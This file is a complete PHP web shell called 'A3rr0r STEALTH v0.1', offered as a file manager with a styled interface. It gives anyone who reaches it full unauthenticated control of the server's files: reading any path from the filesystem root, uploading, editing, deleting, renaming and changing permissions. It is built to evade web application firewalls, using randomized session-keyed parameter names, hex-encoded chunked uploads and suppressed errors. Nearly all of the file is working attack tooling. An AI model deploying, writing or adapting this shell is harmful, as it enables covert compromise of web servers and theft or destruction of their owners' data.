<?php
/**
 * A3rr0r STEALTH v0.1
 * Fix: 0KB Uploads + WAF Compatibility
 */
error_reporting(0);
session_start();

if(!isset($_SESSION['k'])) $_SESSION['k'] = ['a'=>'a_'.substr(md5(rand()),0,4), 'd'=>'d_'.substr(md5(rand()),0,4), 'n'=>'n_'.substr(md5(rand()),0,4), 'v'=>'v_'.substr(md5(rand()),0,4)];
$K = $_SESSION['k'];

$root = __DIR__;
$abs = realpath($_GET['dir'] ?? $root) ?: $root;

if ($act = $_POST[$K['a']] ?? null) {
    $target = $abs . DIRECTORY_SEPARATOR . ($_POST[$K['n']] ?? '');
    switch ($act) {
        case 'save':
            $data = $_POST[$K['d']] ?? '';
            if(file_put_contents($target, $data === "" ? "" : hex2bin($data), ((int)($_POST['idx']??0) === 0 ? 0 : FILE_APPEND)) !== false) die("OK");
            die("ERR");
        case 'del': die((is_dir($target) ? @rmdir($target) : @unlink($target)) ? "OK" : "ERR");
        case 'ren': die(@rename($target, $abs . DIRECTORY_SEPARATOR . $_POST[$K['v']]) ? "OK" : "ERR");
        case 'mod': die(@chmod($target, octdec($_POST[$K['v']])) ? "OK" : "ERR");
    }
}

if (isset($_GET['read'])) die(@file_get_contents($abs . DIRECTORY_SEPARATOR . $_GET['read']));

$items = @scandir($abs) ?: [];
$folders = []; $files = [];
foreach ($items as $i) {
    if ($i == '.' || $i == '..') continue;
    is_dir($abs . DIRECTORY_SEPARATOR . $i) ? $folders[] = $i : $files[] = $i;
}
natcasesort($folders); natcasesort($files);
$all = array_merge(array_map(fn($f)=>['d', $f], $folders), array_map(fn($f)=>['f', $f], $files));

function get_perms($path) { return substr(sprintf('%o', @fileperms($path)), -4); }
function format_size($path) {
    $b = @filesize($path);
    return $b >= 1048576 ? round($b/1048576, 2).' MB' : ($b >= 1024 ? round($b/1024, 2).' KB' : $b.' B');
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>A3rr0r STEALTH v0.1</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.23.4/ace.js"></script>
    <style>
        :root { --bg:#0f172a; --panel:#1e293b; --border:#334155; --text:#cbd5e1; --accent:#3b82f6; --accent-hover:#2563eb; --danger:#ef4444; --success:#10b981; --warning:#f59e0b; }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; padding: 20px; font-size: 14px; }
        .container { max-width: 1000px; margin: 0 auto; }
        .header { background: var(--panel); border: 1px solid var(--border); border-radius: 12px; padding: 20px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .logo { font-size: 1.5rem; font-weight: 800; background: linear-gradient(135deg, #3b82f6, #10b981); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: 2px; }
        .nav { display: flex; gap: 10px; align-items: center; }
        .btn { background: var(--accent); color: #fff; padding: 8px 16px; border-radius: 6px; text-decoration: none; font-weight: 600; border: none; cursor: pointer; transition: 0.2s; font-size: 12px; text-transform: uppercase; }
        .btn:hover { background: var(--accent-hover); }
        .btn-home { background: var(--panel); border: 1px solid var(--border); color: var(--text); }
        .btn-home:hover { background: var(--border); }
        
        .path-bar { background: var(--panel); border: 1px solid var(--border); border-radius: 12px; padding: 12px 20px; margin-bottom: 20px; font-family: monospace; display: flex; flex-wrap: wrap; align-items: center; gap: 5px; }
        .path-bar a { color: var(--accent); text-decoration: none; transition: 0.2s; }
        .path-bar a:hover { color: #fff; }
        .path-bar span { color: #64748b; }

        .file-table { width: 100%; border-collapse: collapse; background: var(--panel); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .file-table th { background: rgba(0,0,0,0.2); padding: 12px 20px; text-align: left; font-size: 11px; text-transform: uppercase; color: #94a3b8; }
        .file-table td { padding: 12px 20px; border-top: 1px solid var(--border); transition: 0.2s; }
        .file-table tr:hover td { background: rgba(255,255,255,0.03); }
        
        .item-name { display: flex; align-items: center; gap: 10px; text-decoration: none; color: #f1f5f9; font-weight: 600; }
        .item-name:hover { color: var(--accent); }
        .icon-d { color: var(--warning); }
        .icon-f { color: var(--accent); }
        
        .perms { font-family: monospace; font-size: 12px; color: var(--success); }
        .size { color: #94a3b8; font-size: 12px; }
        
        .actions { display: flex; gap: 5px; justify-content: flex-end; }
        .action-btn { background: transparent; border: 1px solid var(--border); color: var(--text); padding: 4px 8px; border-radius: 4px; font-size: 10px; cursor: pointer; font-weight: 600; transition: 0.2s; }
        .action-btn:hover { background: rgba(255,255,255,0.1); color: #fff; }
        .act-del:hover { background: var(--danger); border-color: var(--danger); }
        
        #editor-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 50; flex-direction: column; backdrop-filter: blur(5px); }
        .editor-header { background: var(--panel); padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border); }
        .editor-title { color: var(--success); font-weight: 600; font-family: monospace; }
        #ace-editor { flex: 1; }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <div class="logo">A3rr0r STEALTH v0.1</div>
        <div class="nav">
            <input type="file" id="u-input" style="display:none" onchange="up(this)">
            <button onclick="document.getElementById('u-input').click()" id="up-btn" class="btn">Upload File</button>
            <a href="?dir=<?=urlencode($root)?>" class="btn btn-home">Home</a>
        </div>
    </div>

    <div class="path-bar">
        <span>Path:</span> <a href="?dir=/">root</a>
        <?php 
        $pa = '';
        foreach (explode(DIRECTORY_SEPARATOR, trim($abs, DIRECTORY_SEPARATOR)) as $p) {
            if ($p === '') continue;
            $pa .= DIRECTORY_SEPARATOR . $p;
            echo '<span>/</span><a href="?dir='.urlencode($pa).'">'.htmlspecialchars($p).'</a>';
        }
        ?>
    </div>

    <table class="file-table">
        <thead>
            <tr><th>Name</th><th>Size</th><th>Perms</th><th style="text-align:right">Actions</th></tr>
        </thead>
        <tbody>
            <?php foreach($all as $i): $is_d = $i[0]=='d'; $f = $i[1]; $fp = $abs.DIRECTORY_SEPARATOR.$f; ?>
            <tr>
                <td>
                    <?php if($is_d): ?>
                        <a href="?dir=<?=urlencode($fp)?>" class="item-name"><span class="icon-d">📁</span> <?=$f?></a>
                    <?php else: ?>
                        <span class="item-name"><span class="icon-f">📄</span> <?=$f?></span>
                    <?php endif; ?>
                </td>
                <td class="size"><?=$is_d ? 'Dir' : format_size($fp)?></td>
                <td class="perms"><?=get_perms($fp)?></td>
                <td class="actions">
                    <?php if(!$is_d): ?><button onclick="ed('<?=$f?>')" class="action-btn">EDIT</button><?php endif; ?>
                    <button onclick="rn('ren', '<?=$f?>')" class="action-btn">REN</button>
                    <?php if(!$is_d): ?><button onclick="rn('mod', '<?=$f?>')" class="action-btn">MOD</button><?php endif; ?>
                    <button onclick="rn('del', '<?=$f?>')" class="action-btn act-del">DEL</button>
                </td>
            </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
</div>

<div id="editor-modal">
    <div class="editor-header">
        <span class="editor-title" id="ed-title"></span>
        <div class="nav">
            <button onclick="sv()" id="sv-btn" class="btn">Save File</button>
            <button onclick="document.getElementById('editor-modal').style.display='none'" class="btn btn-home act-del">Close</button>
        </div>
    </div>
    <div id="ace-editor"></div>
</div>

<script>
let cur = "", edtr = ace.edit("ace-editor");
edtr.setTheme("ace/theme/monokai");

const K = { a:"<?=$_SESSION['k']['a']?>", d:"<?=$_SESSION['k']['d']?>", n:"<?=$_SESSION['k']['n']?>", v:"<?=$_SESSION['k']['v']?>" };

async function req(d) {
    let fd = new FormData();
    for(let k in d) fd.append(k, d[k]);
    return await (await fetch('', {method:'POST', body:fd})).text();
}

function h2b(u) { return Array.from(u).map(b => b.toString(16).padStart(2,'0')).join(''); }

async function push(n, h, bId) {
    let b = document.getElementById(bId), o = b.innerText, s = 250000, t = Math.ceil(h.length/s);
    for (let i = 0; i < t; i++) {
        b.innerText = `PUSH: ${Math.round(((i+1)/t)*100)}%`;
        let r = await req({ [K.a]:'save', [K.n]:n, [K.d]:h.substring(i*s, (i+1)*s), idx:i });
        if (r.trim() !== "OK") { alert("Failed: " + r); b.innerText = o; return 0; }
        await new Promise(r=>setTimeout(r, 10));
    }
    return 1;
}

async function up(i) {
    let f = i.files[0]; if(!f) return;
    let r = new FileReader();
    r.onload = async (e) => { if(await push(f.name, h2b(new Uint8Array(e.target.result)), 'up-btn')) location.reload(); };
    r.readAsArrayBuffer(f);
}

async function sv() {
    if(await push(cur, h2b(new TextEncoder().encode(edtr.getValue())), 'sv-btn')) location.reload();
}

async function ed(n) {
    cur = n;
    document.getElementById('editor-modal').style.display = 'flex';
    document.getElementById('ed-title').innerText = "EDITING: " + n;
    edtr.setValue(await (await fetch(`?dir=<?=urlencode($abs)?>&read=${n}`)).text(), -1);
}

async function rn(a, n) {
    let v = "";
    if (a === 'ren') v = prompt("New name:", n);
    if (a === 'mod') v = prompt("Perms (e.g. 0644):", "0644");
    if (a === 'del' && !confirm("Delete " + n + "?")) return;
    if ((a === 'ren' || a === 'mod') && !v) return;
    if ((await req({ [K.a]:a, [K.n]:n, [K.v]:v })).trim() === "OK") location.reload();
}
</script>
</body>
</html>